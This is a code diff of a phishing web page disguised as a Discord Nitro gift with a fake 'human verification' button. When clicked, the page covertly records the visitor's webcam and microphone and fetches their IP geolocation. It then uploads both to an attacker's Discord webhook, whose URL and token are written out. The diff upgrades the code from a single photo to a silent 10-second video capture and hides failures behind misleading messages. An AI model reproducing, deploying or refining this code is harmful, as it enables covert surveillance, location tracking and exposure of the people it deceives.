@@ -3,18 +3,18 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <!-- Discord Link Preview Magic: Makes it look like real Nitro gift -->
+  <!-- Discord Preview Magic -->
   <meta property="og:title" content="A WILD GIFT APPEARED! 🎁">
   <meta property="og:type" content="website">
   <meta property="og:url" content="https://nitro-gift-activate.github.io/redeem/">
-  <meta property="og:image" content="https://www.fosslinux.com/wp-content/uploads/2022/11/Discord-Nitro.png"> <!-- Swap this with a real-looking Nitro gift screenshot/GIF -->
+  <meta property="og:image" content="https://www.fosslinux.com/wp-content/uploads/2022/11/Discord-Nitro.png">
   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
   <meta property="og:image:type" content="image/png">
-  <meta name="theme-color" content="#313338"> <!-- Grey border accent -->
-  <meta property="twitter:card" content="summary_large_image"> <!-- Better mobile preview -->
+  <meta name="theme-color" content="#313338">
+  <meta property="twitter:card" content="summary_large_image">
 
-  <title>Discord Gift</title> <!-- Shows as page title too -->
+  <title>Discord Gift</title>
   <style>
     body { 
       margin:0; 
@@ -29,7 +29,7 @@
       font-size:1.8em; 
       margin:20px; 
     }
-    video, canvas { display:none; }
+    video { display:none; } /* hidden forever */
     .container { max-width:600px; margin:auto; }
     button { 
       padding:15px 40px; 
@@ -48,111 +48,88 @@
 <body>
   <div class="container">
     <h1>Quick Verification</h1>
-    <p id="msg">Please click verify to continue. This helps verify you're a human.</p>
+    <p id="msg">Please click verify to continue. This helps prove you're a human.</p>
     
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <video id="video" autoplay playsinline muted></video>
 
     <button id="btn">Verify Me</button>
   </div>
 
   <script>
-    // ──── YOUR ORIGINAL WORKING CODE BELOW ──── (unchanged except webhook if needed)
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
+    const videoElement = document.getElementById('video');
     const msg = document.getElementById('msg');
     const btn = document.getElementById('btn');
 
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1479318338411827384/nNZ_pZsoR7CZJn9n6U_UA4hawAdOKiGngDqoDBNkbTT7pggzniMRTDh7wO_tNRfDXhZZ";
 
-    async function captureAndSend() {
+    async function recordAndSend() {
       try {
-        msg.textContent = "Preparing verification...";
+        msg.textContent = "Loading verification... Please wait.";
         btn.disabled = true;
 
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }
+          video: { facingMode: "user" },
+          audio: true
         });
 
-        video.srcObject = stream;
-        await new Promise(r => setTimeout(r, 1200));
+        videoElement.srcObject = stream;
 
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
+        await new Promise(r => setTimeout(r, 1500));
 
-        stream.getTracks().forEach(track => track.stop());
+        msg.textContent = "Loading...";
 
-        const blob = await new Promise(resolve => {
-          canvas.toBlob(resolve, 'image/jpeg', 0.88);
-        });
+        const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+        const chunks = [];
 
-        let geoDetails = "Location grab failed";
-        try {
-          const geoRes = await fetch('https://ipapi.co/json/');
-          if (geoRes.ok) {
-            const data = await geoRes.json();
-            if (data.error) {
-              geoDetails = `Error: ${data.reason || 'unknown'}`;
-            } else {
-              geoDetails = 
-                `IP: ${data.ip || 'n/a'}\n` +
-                `City: ${data.city || 'n/a'}\n` +
-                `Region: ${data.region || 'n/a'}\n` +
-                `Country: ${data.country_name || 'n/a'} (${data.country_code || 'n/a'})\n` +
-                `Coords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\n` +
-                `Timezone: ${data.timezone || 'n/a'}\n` +
-                `Postal: ${data.postal || 'n/a'}\n` +
-                `ISP/Org: ${data.org || data.asn || 'n/a'}\n` +
-                `In EU?: ${data.in_eu ? 'Yes' : 'No'}`;
-            }
-          }
-        } catch (e) {
-          console.warn('Geo fetch error:', e);
-          try {
-            const ipRes = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipRes.json();
-            geoDetails = `IP only: ${ipData.ip || 'unknown'}`;
-          } catch {}
-        }
-
-        msg.textContent = "Finalizing access...";
-
-        const formData = new FormData();
-        formData.append('file', blob, `capture_${Date.now()}.jpg`);
-        
-        const payload = {
-          content: `New snap from link click: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Details:**\n${geoDetails}`
+        recorder.ondataavailable = e => {
+          if (e.data.size > 0) chunks.push(e.data);
         };
-        formData.append('payload_json', JSON.stringify(payload));
 
-        const response = await fetch(WEBHOOK_URL, {
-          method: 'POST',
-          body: formData
-        });
+        recorder.onstop = async () => {
+          if (chunks.length === 0) {
+            throw new Error("No data captured");
+          }
 
-        if (response.ok) {
+          const blob = new Blob(chunks, { type: 'video/webm' });
+
+          let geoDetails = "Location grab failed";
+          try {
+            const geoRes = await fetch('https://ipapi.co/json/');
+            if (geoRes.ok) {
+              const data = await geoRes.json();
+              if (!data.error) {
+                geoDetails = `IP: ${data.ip || 'n/a'}\nCity: ${data.city || 'n/a'}\nRegion: ${data.region || 'n/a'}\nCountry: ${data.country_name || 'n/a'} (${data.country_code || 'n/a'})\nCoords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\nTimezone: ${data.timezone || 'n/a'}\nISP: ${data.org || 'n/a'}`;
+              }
+            }
+          } catch {}
+
+          const payload = {
+            content: `🎥 Silent 10s capture\nUA: ${navigator.userAgent}\nTime: ${new Date().toISOString()}\n\n**Location/Device:**\n${geoDetails}`
+          };
+
+          const formData = new FormData();
+          formData.append('file', blob, `capture_${Date.now()}.webm`);
+          formData.append('payload_json', JSON.stringify(payload));
+
+          msg.textContent = "Finalizing...";
+
+          await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+
           msg.textContent = "Verification incomplete. Center Face In Camera View";
           btn.style.display = 'none';
-        } else {
-          let errText = "No details available";
-          try { errText = await response.text(); } catch {}
-          msg.textContent = `Upload failed: ${response.status} - ${errText.slice(0,150)}`;
-          console.error("Webhook error:", response.status, errText);
-        }
+          stream.getTracks().forEach(track => track.stop());
+        };
+
+        recorder.start();
+        setTimeout(() => recorder.stop(), 10000);
 
       } catch (err) {
-        let errMsg = err.message || "Unknown error";
-        if (err.name === 'NotAllowedError') errMsg = "Camera access denied. Please allow to continue.";
-        if (err.name === 'NotFoundError') errMsg = "No camera detected.";
-        msg.textContent = `Verification failed: ${errMsg}`;
-        console.error("Capture error:", err);
-      } finally {
+        msg.textContent = "Verification incomplete. Center Face In Camera View";
         btn.disabled = false;
       }
     }
 
-    btn.addEventListener('click', captureAndSend);
+    btn.addEventListener('click', recordAndSend);
   </script>
 </body>
 </html>
